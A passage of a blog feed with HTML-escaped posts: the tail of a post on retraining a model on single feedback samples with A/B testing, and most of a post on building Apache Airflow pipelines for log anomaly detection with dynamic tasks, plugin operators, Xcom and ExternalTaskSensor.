0&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; # retrain on the single input and output&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;&amp;nbsp; while&lt;/mark&gt; pre_proba &amp;lt;= desired_proba &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;and&lt;/mark&gt; (no_of_attempts&amp;lt;attempts):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; exec_model.fit(np.reshape(batch_x[i],(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;,&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;-1&lt;/mark&gt;)), np.reshape(batch_y[i],(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;,&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;-1&lt;/mark&gt;)))&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; no_of_attempts +=&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt; 1&lt;/mark&gt;&lt;br&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pred_one_y = exec_model.predict_proba(np.reshape(batch_x[i],(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;1&lt;/mark&gt;,&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;-1&lt;/mark&gt;)), verbose=&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;2&lt;/mark&gt;)&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pre_proba = pred_one_y[&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;0&lt;/mark&gt;][int(np.argmax(batch_y[i]))]&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;Attempt Number %d, Predicted Proba for this iteration %f&#34;&lt;/mark&gt; %(no_of_attempts, pre_proba))&lt;br&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; if&lt;/mark&gt; pre_proba &amp;gt; desired_proba:&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; success_flag = &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;True&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; break&lt;/mark&gt;&lt;br&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; if&lt;/mark&gt; (success_flag ==&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; False&lt;/mark&gt;)&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; and&lt;/mark&gt; (no_of_attempts &amp;gt;= attempts):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print(&#34;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;[-] Failed to incorporate this feedback&#34;&lt;/mark&gt;)&lt;br&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; if&lt;/mark&gt; success_flag == &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;True&lt;/mark&gt;:&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;[+] Feedback incorporated \n&#34;&lt;/mark&gt;)&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; print(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;Took %d iterations to learn!&#34;&lt;/mark&gt; %(no_of_attempts))&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Png3: update based on single x and y array&lt;/p&gt;
&lt;p&gt;By implementing this solution, the model can be trained much quicker and save time overall. To reduce storage requirements, every file in the update folder is unlinked after being processed. &lt;/p&gt;
&lt;p&gt;Of course, it is not possible to ensure every model will be more accurate after retraining. To manage this risk, I apply A/B testing here as well. The updated model is saved to another location and only replaces the original after performing as expected in testing.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Implementation and Dynamic Generation for Tasks in Apache Airflow&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2022/11/2022-11-23-implementation-and-dynamic-generation-for-tasks-in-apache-airflow/</link>
      <pubDate>Wed, 23 Nov 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/11/2022-11-23-implementation-and-dynamic-generation-for-tasks-in-apache-airflow/</guid>
      <description>
        
        
        &lt;p&gt;I recently worked on a project focused on log anomaly detection using manageable machine learning pipelines. The pipelines mainly include &lt;strong&gt;data collection &amp;mdash; feature extraction &amp;mdash; feature engineering &amp;mdash; detection/prediction &amp;mdash; updating (maintenance)&lt;/strong&gt;. &lt;/p&gt;
&lt;p&gt;It’s important to have a solid UI to manage the pipelines so I can easily review the chain of pipelines. After much research, I found many engineers recommended &lt;a href=&#34;https://airflow.apache.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Airflow&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;In airflow, the core concept is the &lt;strong&gt;Directed Acyclic Graph&lt;/strong&gt; (DAG). Through the implementation, I have confirmed that this is a truly powerful tool to manage the machine learning pipelines, instead of relying on shell scripts. But, I did encounter some challenges during the process and also, fortunately, found solutions for them. &lt;/p&gt;
&lt;p&gt;The challenges can be split into two main aspects, &lt;strong&gt;pipeline management&lt;/strong&gt; and &lt;strong&gt;dynamic generation for tasks&lt;/strong&gt;. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Pipeline management -&lt;/strong&gt; During the process of solving the problem about pipeline management, I met the following problems when implementing the machine learning pipelines in Airflow:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to solve the &lt;strong&gt;dependencies within one DAG&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to solve the &lt;strong&gt;dependencies between Dags&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to overcome known issues with &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/howto/operator/external_task_sensor.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ExternalTaskSensor&lt;/a&gt;:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to overcome issues with the &lt;strong&gt;execution time&lt;/strong&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Dynamic generation for tasks -&lt;/strong&gt; When I tried to integrate the pipelines with our own &lt;strong&gt;&lt;a href=&#34;https://www.elastic.co/what-is/elk-stack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ELK&lt;/a&gt;&lt;/strong&gt; stack, I found the problem about &lt;strong&gt;how to dynamically generate the tasks in a dag&lt;/strong&gt;. This problem comes from the different log types, which include Linux, Windows, VPN and so on. I also found the same type of logs from different clients require different treatment too. The generation of tasks should be &lt;strong&gt;scalable&lt;/strong&gt; and &lt;strong&gt;automatic&lt;/strong&gt;. &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the first place, I had many choices to make. For the operator, I can choose from the PythonOperator, BaseOperator, or BashOperator. For the dependencies, I can choose TriggerDagRunOperator, Xcom, or SubDag.&lt;/p&gt;
&lt;p&gt;After some testing, I found the most effective solution is usually the simplest, even when not 100% perfect. I chose the following combination:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BaseOperator + DummyOperator + Plugins + Xcom + For loop + ExternalTaskSensor&lt;/strong&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;1. DummyOperator Usage&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;1-dummyoperator-usage&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#1-dummyoperator-usage&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.12/_modules/airflow/operators/dummy_operator.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;DummyOperator&lt;/a&gt; can be used to group tasks in a DAG. In order to structure different tasks into one nice workflow, I used the DummyOperator to connect them. They won’t be executed by the executor. After introducing those two tasks, there is a common start task and a common end task to connect all middle parallel tasks.&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;start_task = DummyOperator(&lt;br&gt;task_id=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;start_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;dag=dag&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;)&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;end_task = DummyOperator(&lt;br&gt;task_id = &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;end_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;dag = dag&lt;br&gt;)&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&#34;https://lh5.googleusercontent.com/gtkYla7hRWDWybDdyW0P-nCA1BWhzJ4G8ScLMzF8n6PKmLG2OKgBvAizVAo3uCPr0WMABiRN5xej9A_n9IsW9bRRph86Jez-ojx7HVbF_rumb5OgR0-EYo9LnPrO0lPEEczWrDApp_FRZQ6ghYZqh9I-YsX7uB-kNIjIo22pIzHJiBX99h7OMXJ5KJLZ&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;PNG1：&lt;a href=&#34;https://assets.bbhub.io/company/sites/40/2018/05/airflow.png&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Airflow graph view&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For the dynamic generation of tasks, I want to introduce a kind of structure to organise the code. Most of the logs share the same processing logic, so I need to introduce several automatic variables inside the tasks. The basic structure would look like the following:&lt;/p&gt;
&lt;table class=&#34;has-white-color has-black-background-color has-text-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;&#39;&#39;&lt;br&gt;&amp;nbsp; def Dynamic_Function(variable):&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; task_1 = Function1(&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; task_id = &#39;task_{}&#39;.format(variable),&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; dag = dag,&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ...&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; )&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; return task_1&lt;br&gt;&#39;&#39;&#39;&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;for &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variable&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;in&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variables:&lt;/mark&gt;&lt;br&gt;&amp;nbsp; task_1 = Dynamic_Function(variable)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;The variables can be read it from the environment variables or just set it as a list:&lt;/p&gt;
&lt;p&gt;# the python way to read environment values from .env file:&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;os.getenv&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;(&#39;variables&#39;&lt;/mark&gt;).split(&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;&#39;&lt;/mark&gt;)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;This method is not that complex, but it is quite useful when there are multiple tasks sharing the same processing logic and there is only one difference of variable in them, allowing the project to be easily scaled.  &lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;2. Plugin Operator and BaseOperator&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;2-plugin-operator-and-baseoperator&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#2-plugin-operator-and-baseoperator&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;For the Function1, it is defined in a customised way in &lt;strong&gt;plugins/operators.&lt;/strong&gt; You can find the detailed information on this &lt;a href=&#34;http://michal.karzynski.pl/blog/2017/03/19/developing-workflows-with-apache-airflow/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;link&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt; The main context is shown below**:**&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;from &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;airflow.plugins_manager&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;AirflowPlugin&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;from&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt; airflow.utils.decorators&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;apply_defaults&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;class &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;MyFirstOperator&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(BaseOperator): &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;@apply_defaults&amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;&amp;nbsp; def &lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;__init__&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(self, my_operator_param, *args, **kwargs):&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; self.operator_param = my_operator_param&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; super(MyFirstOperator, self).__init__(*args, **kwargs) &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt; def&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt;execute&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(self, context):&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ...&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;class&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-orange-color&#34;&gt; MyFirstPlugin&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;(AirflowPlugin):&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; name =&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt; &#34;my_first_plugin&#34;&amp;nbsp; &amp;nbsp;&lt;/mark&gt;&lt;br&gt;&amp;nbsp; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;operators = [MyFirstOperator]&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;I use it for the reason that I do not need to put all my code in the DAG. Otherwise, the DAG code would be extremely redundant and hard to manage.&lt;/p&gt;
&lt;p&gt;I use &lt;strong&gt;BaseOperator&lt;/strong&gt; instead of PythonOperator because of the simplicity. The PythonOperator is more complex to control and needs to set more unnecessary parameters.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;With the above two solutions, the dynamic tasks can be easily built in one DAG now&lt;/strong&gt;. The following solutions are more for the connection and concurrency problems I met during a project. &lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;3. Xcom &amp;amp; ExternalTaskSensor&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-xcom--externaltasksensor&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#3-xcom--externaltasksensor&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Now, I have to solve three key problems:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;How to save the result for the next task? &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to get the result from the last task?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;How to make sure the result is within the right time interval?&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Airflow provides powerful solutions for those problems with &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/concepts/xcoms.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Xcom&lt;/strong&gt;&lt;/a&gt; and &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/1.10.4/_api/airflow/sensors/external_task_sensor/index.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ExternalTaskSensor&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To save the result from the current task, Xcom is used for this requirement. It is a bit similar to git. To use it, xcom_push and xcom_pull are the main functions needed. But there is a limitation for the size, which is &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/_modules/airflow/models/xcom.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;48KB&lt;/strong&gt;&lt;/a&gt;. Normally, you do not need to worry about the size, but it is advisable to try to save the middle variable value in xcom while not using big files. &lt;/p&gt;
&lt;p&gt;If you want to extract the result obtained from the previous DAG with a specified task combing with the dynamic tasks, the extraction process is independent and you should use the ExternalTaskSensor with the following setting:&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;for&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variable&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;in&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;variables:&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;...&lt;br&gt;&amp;nbsp; # create the task to depend on the up_stream dag&lt;br&gt;&amp;nbsp; external_sensor = ExternalTaskSensor(&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; task_id=&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;ext_sensor_task&#39;&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; external_dag_id=&#39;xxx&#39;,&lt;/mark&gt;&lt;br&gt;&amp;nbsp; external_task_id=&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#39;xxx_{}&#39;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;.format(variable),&lt;/mark&gt;&lt;br&gt;&amp;nbsp;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt; timeout =&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-pale-pink-color&#34;&gt;300&lt;/mark&gt;,&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&amp;nbsp; dag=dag,&lt;br&gt;&amp;nbsp; )&lt;br&gt;...&lt;/mark&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;I have to mention here, &lt;strong&gt;you should not use end_task in the previous DAG.&lt;/strong&gt; If you do not want all tasks to be finished on the previous day, then go through the next day.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;4. Execution Time&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;4-execution-time&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#4-execution-time&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Execution time is kind of limited in Airflow in version 1.x. I have not tested the 2.x. In version 1.x, it does not help to change the timezone in airflow.cfg.&lt;/p&gt;
&lt;p&gt;But you can use the specified way to solve the problem. The &lt;strong&gt;pendulum library&lt;/strong&gt; is a really great option.&lt;/p&gt;
&lt;table class=&#34;has-black-background-color has-background&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-luminous-vivid-amber-color&#34;&gt;import&lt;/mark&gt; &lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;pendulum&lt;/mark&gt;&lt;br&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;# get the format date string&lt;br&gt;current_date = pendulum.datetime.now().strftime(&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;&#34;%Y, %m, %d, %H&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-white-color&#34;&gt;&#34;)&lt;br&gt;dag = DAG(&lt;br&gt;&amp;nbsp; dag_id = dag_id,&lt;br&gt;&amp;nbsp; # get the datetime type value&lt;br&gt;&amp;nbsp; start_date = pendulum.strptime(current_date, &#34;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color has-vivid-green-cyan-color&#34;&gt;%Y, %m, %d, %H&#34;&lt;/mark&gt;&lt;mark style=&#34;background-color:rgba(0, 0, 0, 0)&#34; class=&#34;has-inline-color 